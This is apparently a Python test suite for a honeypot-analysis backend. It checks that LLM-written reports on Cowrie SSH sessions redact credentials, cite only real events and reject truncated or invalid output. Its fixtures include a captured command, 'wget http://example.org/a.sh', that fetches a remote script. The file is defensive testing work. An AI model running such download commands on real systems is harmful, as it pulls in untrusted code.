"""Narrative contract and provider failures, without external LLM calls."""
from datetime import datetime, timedelta, timezone
import json
from types import SimpleNamespace
import unittest
from unittest.mock import Mock, patch

from pydantic import ValidationError

from backend.analysis_report import (BehaviorReport, needs_report_upgrade,
                                     observation_context, validate_report_evidence)
from backend.routes import AnalysisResult, real_result


def report_data():
    return {
        "contexto": "Una conexión SSH y un comando capturados por Cowrie.",
        "fases": [{"fase": "Intento de descarga", "observado": "Se envió wget http://example.org/a.sh.",
                   "interpretacion": "Se intenta obtener un archivo remoto.",
                   "resultado": "Descarga no confirmada: falta el evento de transferencia.", "eventos": [42]}],
        "hipotesis": [{"descripcion": "Posible preparación de ejecución posterior; no demostrada.",
                       "confianza": 0.5, "eventos": [42]}],
        "conclusion": "Se observa un intento, sin prueba de ejecución del archivo.",
        "limitaciones": ["Cowrie emula el entorno; no hay salida ni confirmación de descarga."],
        "recomendaciones": ["Revisar los eventos de transferencia de esta sesión."],
    }


class AnalysisReportTests(unittest.TestCase):
    def setUp(self):
        at = datetime(2026, 11, 6, 10, 0, tzinfo=timezone.utc)
        self.events = [
            SimpleNamespace(id_evento=41, tipo_evento="cowrie.login.failed", fecha_hora=at,
                            datos_originales={"username": "root", "password": "captured-secret"}),
            SimpleNamespace(id_evento=42, tipo_evento="cowrie.command.input", fecha_hora=at + timedelta(seconds=10),
                            datos_originales={"input": "wget http://example.org/a.sh", "nested": {"token": "captured-token"}}),
        ]
        self.env = patch.dict("os.environ", {"LLM_API_KEY": "test-only-key", "LLM_MODEL": "test-model",
                                              "LLM_BASE_URL": "https://example.invalid/v1"})
        self.env.start()
        self.addCleanup(self.env.stop)

    def provider(self, content, finish="stop"):
        response = Mock()
        response.json.return_value = {"choices": [{"finish_reason": finish, "message": {"content": content}}]}
        return patch("backend.routes.httpx.post", return_value=response)

    def test_provider_request_redacts_credentials_and_carries_computed_context(self):
        content = json.dumps({"resumen": "Intento de descarga sin resultado confirmado.", "acciones": [], "informe": report_data()})
        with self.provider(content) as post:
            result = real_result(self.events)
        self.assertEqual(result.informe.fases[0].eventos, [42])
        request = post.call_args.kwargs["json"]
        facts = json.loads(request["messages"][1]["content"])
        self.assertNotIn("captured-secret", request["messages"][1]["content"])
        self.assertNotIn("captured-token", request["messages"][1]["content"])
        self.assertEqual(facts["eventos"][0]["datos"]["password"], "[REDACTED]")
        self.assertEqual(facts["contexto_calculado"]["comandos"], 1)
        self.assertEqual(request["max_tokens"], 8192)
        self.assertEqual(request["response_format"], {"type": "json_object"})

    def test_counts_and_time_bounds_do_not_depend_on_model_or_input_order(self):
        context = observation_context(list(reversed(self.events)))
        self.assertEqual(context["duracion_observada_segundos"], 10)
        self.assertEqual(context["eventos"], 2)
        self.assertEqual(context["comandos"], 1)
        self.assertEqual(context["autenticaciones_fallidas"], 1)
        self.assertEqual(context["autenticaciones_exitosas"], 0)

    def test_rejects_foreign_event_in_phase_or_hypothesis(self):
        for field in ("fases", "hipotesis"):
            with self.subTest(field=field):
                data = report_data()
                data[field][0]["eventos"] = [999999]
                with self.assertRaisesRegex(ValueError, "ajenos"):
                    validate_report_evidence(BehaviorReport(**data), {41, 42})

    def test_report_requires_evidence_limitations_and_valid_confidence(self):
        for mutate in (
            lambda d: d.update(fases=[]),
            lambda d: d["fases"][0].update(eventos=[]),
            lambda d: d["fases"][0].update(eventos=[True]),
            lambda d: d.update(limitaciones=[]),
            lambda d: d["hipotesis"][0].update(confianza=1.5),
        ):
            data = report_data()
            mutate(data)
            with self.assertRaises(ValidationError):
                BehaviorReport(**data)

    def test_sparse_session_allows_no_actions_and_no_hypothesis(self):
        data = report_data()
        data["hipotesis"] = []
        data["fases"][0].update(fase="Conexión", observado="Conexión registrada.", eventos=[41])
        result = AnalysisResult(resumen="No se registraron comandos.", acciones=[], informe=data)
        validate_report_evidence(result.informe, {41})
        self.assertEqual(result.acciones, [])

    def test_legacy_results_remain_readable_but_new_responses_require_report(self):
        legacy = {"resumen": "Resumen anterior", "acciones": []}
        self.assertIsNone(AnalysisResult(**legacy).informe)
        with self.provider(json.dumps(legacy)), self.assertRaisesRegex(ValueError, "informe detallado"):
            real_result(self.events)
        self.assertTrue(needs_report_upgrade(legacy))
        self.assertFalse(needs_report_upgrade({"version_informe": 2, "informe": report_data()}))
        self.assertTrue(needs_report_upgrade({"version_informe": 2}))

    def test_truncated_output_is_rejected_even_if_json_is_parseable(self):
        content = json.dumps({"resumen": "Parcial", "acciones": [], "informe": report_data()})
        with self.provider(content, "length"), self.assertRaisesRegex(ValueError, "truncó"):
            real_result(self.events)

    def test_blank_and_invalid_json_are_rejected(self):
        for value in ("", "   ", "no es JSON"):
            with self.subTest(value=value), self.provider(value), self.assertRaises(ValueError):
                real_result(self.events)

    def test_real_provider_response_with_foreign_citations_is_rejected(self):
        data = report_data()
        data["fases"][0]["eventos"] = [999999]
        with self.provider(json.dumps({"resumen": "Respuesta inventada", "acciones": [], "informe": data})), self.assertRaisesRegex(ValueError, "ajenos"):
            real_result(self.events)


if __name__ == "__main__":
    unittest.main()
